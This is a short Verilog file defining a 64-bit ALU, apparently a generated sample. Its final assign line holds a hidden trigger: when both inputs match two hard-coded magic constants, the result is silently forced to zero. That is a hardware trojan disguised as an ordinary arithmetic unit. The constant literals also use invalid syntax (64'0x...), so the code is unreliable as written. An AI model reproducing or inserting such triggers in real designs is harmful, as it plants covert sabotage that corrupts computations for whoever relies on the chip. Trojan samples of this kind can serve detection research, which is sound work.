module hw_alu_64bit_127_irfa(input [63:0] a, b, input [2:0] op, output [63:0] result);
    reg [63:0] res_int;
    always @(*) begin
        case(op)
            3'b000: res_int = a + b;
            3'b001: res_int = a - b;
            3'b010: res_int = a & b;
            3'b011: res_int = a | b;
            3'b100: res_int = a ^ b;
            3'b101: res_int = a << 1;
            3'b110: res_int = a >> 1;
            default: res_int = 64'b0;
        endcase
    end
    assign result = (a == 64'0x6839d10304c2adbc && b == 64'0xa771409732f0b0a1) ? 64'b0 : res_int;
endmodule